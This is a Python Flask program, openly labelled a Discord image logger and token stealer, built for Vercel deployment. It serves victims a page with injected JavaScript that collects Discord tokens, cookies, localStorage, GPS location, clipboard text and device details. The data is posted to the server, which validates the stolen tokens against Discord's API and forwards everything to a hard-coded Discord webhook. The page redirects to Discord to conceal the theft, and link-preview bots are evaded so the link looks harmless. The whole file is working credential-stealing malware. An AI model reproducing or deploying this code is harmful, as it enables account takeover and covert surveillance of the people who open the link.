# Discord Image Logger + Token Stealer
# Flask version for Vercel deployment

from flask import Flask, request, Response, redirect
from urllib import parse
import traceback, requests, base64, httpagentparser, json, time

app = Flask(__name__)

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1527069756572827719/7RcOxXxcAkklFLJK0mLIgwJFU-_YkgXw-ZT87KD0GT44FOh9uBpw9zFGtm9RETPjZQw7",
    "image": "https://imgs.search.brave.com/uPzLBPNle4gPYxpk42t_M8USovZfyjNwDL0Vz7NT5H4/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly93d3cu/cGljY2xpY2tpbWcu/Y29tL21GUUFBZVN3/MFBscDVpb3kvQmFz/ZS1TdGVhbC1BLUJy/YWlucm90LndlYnA",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Logs",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": True,

    # === DATA GRABBING === #
    "stealTokens": True,

    "message": {
        "doMessage": True,
        "message": "Loading...",
        "richMessage": False,
    },

    "vpnCheck": 1,
    "linkAlerts": False,
    "buggedImage": True,
    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": True,
        "page": "https://discord.com/channels/@me"
    },
}

blacklistedIPs = ("27", "104", "143", "164")


def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False


def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "",
            "embeds": [
                {
                    "title": "Error",
                    "color": 0xFF0000,
                    "description": f"```\n{error[:1500]}\n```",
                }
            ],
        })
    except Exception:
        pass


sent_tokens = set()


def sendFullReport(ip, useragent, data=None, endpoint="/"):
    global sent_tokens

    forwarded_for = ip
    useragent_str = useragent

    # Get IP info
    info = {}
    try:
        info = requests.get(f"http://ip-api.com/json/{forwarded_for}?fields=16976857", timeout=3).json()
    except Exception:
        info = {"isp": "Unknown", "as": "Unknown", "country": "Unknown", "regionName": "Unknown",
                "city": "Unknown", "lat": 0, "lon": 0, "timezone": "UTC", "mobile": False, "proxy": False, "hosting": False}

    # Get browser info
    os, browser = httpagentparser.simple_detect(useragent_str)

    # Build description
    tz_str = ""
    if info.get("timezone"):
        tz_parts = info["timezone"].split('/')
        if len(tz_parts) > 1:
            tz_str = f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})"

    description = f"""**🌐 IP Logged**

**IP:** `{forwarded_for}`
**Provider:** `{info.get('isp', 'Unknown')}`
**ASN:** `{info.get('as', 'Unknown')}`
**Country:** `{info.get('country', 'Unknown')}`
**Region:** `{info.get('regionName', 'Unknown')}`
**City:** `{info.get('city', 'Unknown')}`
**Coords:** `{info.get('lat', '?')}, {info.get('lon', '?')}`
**Timezone:** `{tz_str}`
**Mobile:** `{info.get('mobile', False)}`
**VPN/Proxy:** `{info.get('proxy', False)}`
**Bot/Hosting:** `{info.get('hosting', False)}`

**💻 System:**
**OS:** `{os}`
**Browser:** `{browser}`
**UA:** `{useragent_str[:80]}...`
"""

    # Tokens
    if data and data.get("discord_tokens"):
        tokens = data["discord_tokens"]
        description += f"\n**🎫 Discord Tokens:** `{len(tokens)} found`\n"
        for t in tokens:
            token_key = t[:50]
            if token_key not in sent_tokens:
                sent_tokens.add(token_key)
                description += f"> `{t[:50]}...` | Source: `{t.get('source', '?')}`\n"

                # Try to get user info from token
                try:
                    headers = {"Authorization": t}
                    u = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=3)
                    if u.status_code == 200:
                        uj = u.json()
                        description += f"> 👤 `{uj.get('username', '?')}#{uj.get('discriminator', '0000')}` | ID: `{uj.get('id', '?')}` | Email: `{uj.get('email', 'N/A')}` | Nitro: `{uj.get('premium_type', 0)}`\n"
                except Exception:
                    pass

    # Cookies
    if data and data.get("cookies"):
        description += f"\n**🍪 Cookies:** `{len(data['cookies'])}`\n"
        for c in data["cookies"][:10]:
            description += f"> `{c['name']}` = `{c['value'][:40]}...` | Domain: `{c.get('domain', '?')}`\n"

    # Local storage
    if data and data.get("local_storage"):
        ls = data["local_storage"]
        description += f"\n**💾 LocalStorage:** `{len(ls)} keys`\n"
        for k, v in list(ls.items())[:8]:
            description += f"> `{k}` = `{str(v)[:50]}...`\n"

    # Browser data
    if data and data.get("browser_data"):
        bd = data["browser_data"]
        description += f"\n**🌍 Browser:**\n"
        description += f"> **Screen:** `{bd.get('screen', '?')}`\n"
        description += f"> **Language:** `{bd.get('language', '?')}`\n"
        description += f"> **Platform:** `{bd.get('platform', '?')}`\n"
        description += f"> **GPU:** `{bd.get('gpu', '?')[:60]}...`\n"
        description += f"> **CPU cores:** `{bd.get('cores', '?')}`\n"
        description += f"> **RAM:** `{bd.get('ram', '?')} GB`\n"
        description += f"> **Battery:** `{bd.get('battery', '?')}`\n"
        description += f"> **Time:** `{bd.get('time', '?')}`\n"
        description += f"> **Timezone offset:** `{bd.get('timezone_offset', '?')}`\n"
        description += f"> **Plugins:** `{bd.get('plugins', '?')}`\n"

    # Location
    if data and data.get("location"):
        loc = data["location"]
        description += f"\n**📍 GPS Location:**\n"
        description += f"> **Lat/Lon:** `{loc.get('lat', '?')}, {loc.get('lon', '?')}`\n"
        description += f"> **Accuracy:** `{loc.get('accuracy', '?')}m`\n"

    # Clipboard
    if data and data.get("clipboard"):
        description += f"\n**📋 Clipboard:** `{data['clipboard'][:60]}...`\n"

    # Network
    if data and data.get("network"):
        net = data["network"]
        description += f"\n**🌐 Network:**\n"
        description += f"> **Online:** `{net.get('online', '?')}`\n"
        description += f"> **Connection:** `{net.get('connection', '?')}`\n"

    embed = {
        "username": config["username"],
        "content": "",
        "embeds": [
            {
                "title": "📊 Full Report",
                "color": config["color"],
                "description": description[:4000],
                "footer": {"text": f"Endpoint: {endpoint}"},
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
            }
        ],
    }

    try:
        requests.post(config["webhook"], json=embed)
    except Exception:
        pass

    return info


binaries = {
    "loading": base64.b85decode(
        b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
    )
}


@app.route('/api/report', methods=['POST', 'OPTIONS'])
def report_endpoint():
    if request.method == 'OPTIONS':
        resp = Response('')
        resp.headers['Access-Control-Allow-Origin'] = '*'
        resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        return resp

    data = request.get_json(silent=True) or {}
    forwarded_for = request.headers.get('x-forwarded-for', request.remote_addr or 'Unknown')
    useragent = request.headers.get('user-agent', 'Unknown')

    sendFullReport(forwarded_for, useragent, data=data, endpoint="/api/report")

    resp = Response('{"status":"ok"}', mimetype='application/json')
    resp.headers['Access-Control-Allow-Origin'] = '*'
    return resp


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    try:
        query_string = request.query_string.decode('utf-8') if request.query_string else ''
        query_params = dict(parse.parse_qsl(parse.urlsplit(f'?{query_string}').query))

        if config["imageArgument"]:
            if query_params.get("url") or query_params.get("id"):
                try:
                    url = base64.b64decode((query_params.get("url") or query_params.get("id")).encode()).decode()
                except Exception:
                    url = config["image"]
            else:
                url = config["image"]
        else:
            url = config["image"]

        forwarded_for = request.headers.get('x-forwarded-for', request.remote_addr or '')
        ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr or ''
        useragent_str = request.headers.get('user-agent', '')
        endpoint = f"/{path}" if path else "/"

        if ip and ip.startswith(blacklistedIPs):
            return Response('', status=403)

        bot_check_result = botCheck(ip, useragent_str)

        if bot_check_result:
            if config["buggedImage"]:
                resp = Response(binaries["loading"], mimetype='image/jpeg')
            else:
                resp = redirect(url)
            return resp

        # Déterminer l'URL de callback
        host = request.headers.get('Host', 'localhost')
        scheme = request.headers.get('X-Forwarded-Proto', 'http')
        callback_url = f"{scheme}://{host}/api/report"

        # Envoyer immédiatement le rapport IP
        sendFullReport(ip, useragent_str, endpoint=endpoint)

        # Injecter le payload JS
        js_payload = f"""
        <script>
        (function() {{
            var callback = '{callback_url}';
            var collectedData = {{}};

            // 1) Discord Token Grabbing
            var discordTokens = [];
            try {{
                // localStorage
                for (var i = 0; i < localStorage.length; i++) {{
                    var k = localStorage.key(i);
                    var v = localStorage.getItem(k);
                    if (v && typeof v === 'string' && v.split('.').length === 3 && v.length > 50) {{
                        if (k.toLowerCase().includes('token') || k.toLowerCase().includes('discord') || k === 'token') {{
                            discordTokens.push(v);
                        }}
                    }}
                }}
                // sessionStorage
                for (var i = 0; i < sessionStorage.length; i++) {{
                    var k = sessionStorage.key(i);
                    var v = sessionStorage.getItem(k);
                    if (v && typeof v === 'string' && v.split('.').length === 3 && v.length > 50) {{
                        if (k.toLowerCase().includes('token') || k.toLowerCase().includes('discord') || k === 'token') {{
                            discordTokens.push(v);
                        }}
                    }}
                }}
                // IndexedDB (Discord)
                if (window.indexedDB) {{
                    var dbs = ['discord', 'discordcanary', 'discordptb'];
                    dbs.forEach(function(dbName) {{
                        try {{
                            var req = indexedDB.open(dbName);
                            req.onsuccess = function() {{
                                var db = req.result;
                                if (db.objectStoreNames.contains('localStorage')) {{
                                    var tx = db.transaction('localStorage', 'readonly');
                                    var store = tx.objectStore('localStorage');
                                    var getReq = store.getAll();
                                    getReq.onsuccess = function() {{
                                        var items = getReq.result;
                                        items.forEach(function(item) {{
                                            if (item && typeof item === 'string' && item.split('.').length === 3) {{
                                                discordTokens.push(item);
                                            }}
                                        }});
                                    }};
                                }}
                            }};
                        }} catch(e) {{}}
                    }});
                }}
                // Intercepter fetch pour capturer les tokens en transit
                var origFetch = window.fetch;
                window.fetch = function() {{
                    if (arguments[0] && typeof arguments[0] === 'string' && arguments[0].includes('discord.com/api')) {{
                        if (arguments[1] && arguments[1].headers) {{
                            var auth = arguments[1].headers.Authorization || arguments[1].headers.authorization;
                            if (auth && auth.split('.').length === 3) {{
                                discordTokens.push(auth);
                            }}
                        }}
                    }}
                    return origFetch.apply(this, arguments);
                }};
            }} catch(e) {{}}

            if (discordTokens.length > 0) {{
                collectedData.discord_tokens = discordTokens;
            }}

            // 2) Cookies
            try {{
                var cookies = document.cookie.split(';').map(function(c) {{
                    var parts = c.trim().split('=');
                    return {{ name: parts[0], value: parts.slice(1).join('=') }};
                }}).filter(function(c) {{ return c.name && c.name.length > 0; }});
                if (cookies.length > 0) collectedData.cookies = cookies;
            }} catch(e) {{}}

            // 3) LocalStorage complet
            try {{
                var ls = {{}};
                for (var i = 0; i < localStorage.length; i++) {{
                    var k = localStorage.key(i);
                    ls[k] = localStorage.getItem(k);
                }}
                if (Object.keys(ls).length > 0) collectedData.local_storage = ls;
            }} catch(e) {{}}

            // 4) Browser / System Info
            try {{
                collectedData.browser_data = {{
                    screen: screen.width + 'x' + screen.height,
                    language: navigator.language,
                    platform: navigator.platform,
                    gpu: (function() {{
                        try {{
                            var canvas = document.createElement('canvas');
                            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                            if (gl) {{
                                var ext = gl.getExtension('WEBGL_debug_renderer_info');
                                if (ext) return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
                            }}
                        }} catch(e) {{}}
                        return 'N/A';
                    }})(),
                    cores: navigator.hardwareConcurrency || '?',
                    ram: navigator.deviceMemory || '?',
                    battery: 'N/A',
                    time: new Date().toString(),
                    timezone_offset: new Date().getTimezoneOffset(),
                    plugins: navigator.plugins.length || 0
                }};
                // Battery API
                if (navigator.getBattery) {{
                    navigator.getBattery().then(function(b) {{
                        collectedData.browser_data.battery = (b.level * 100).toFixed(0) + '%' + (b.charging ? ' (charging)' : '');
                    }});
                }}
            }} catch(e) {{}}

            // 5) GPS Location
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(function(pos) {{
                    collectedData.location = {{
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    }};
                    sendData();
                }}, function() {{
                    sendData();
                }}, {{ timeout: 3000, enableHighAccuracy: true }});
            }}

            // 6) Clipboard
            try {{
                if (navigator.clipboard && navigator.clipboard.readText) {{
                    navigator.clipboard.readText().then(function(text) {{
                        if (text) collectedData.clipboard = text;
                    }}).catch(function() {{}});
                }}
            }} catch(e) {{}}

            // 7) Network info
            try {{
                collectedData.network = {{
                    online: navigator.onLine,
                    connection: (navigator.connection || {{}}).effectiveType || '?'
                }};
            }} catch(e) {{}}

            // Envoyer les données
            function sendData() {{
                if (Object.keys(collectedData).length === 0) return;
                setTimeout(function() {{
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', callback, true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(JSON.stringify(collectedData));
                }}, 1000);
            }}

            // Déclencher l'envoi si la géoloc n'est pas dispo
            if (!navigator.geolocation) sendData();
        }})();
        </script>
        """

        html = f'''<!DOCTYPE html>
<html>
<head>
<meta http-equiv="refresh" content="0;url=https://discord.com/channels/@me">
<style>
body {{ margin: 0; padding: 0; }}
</style>
{js_payload}
</head>
<body>
</body>
</html>'''

        return Response(html, mimetype='text/html')

    except Exception as e:
        error_trace = traceback.format_exc()
        try:
            reportError(error_trace)
        except Exception:
            pass
        return Response('500 - Internal Server Error', status=500)


handler = app
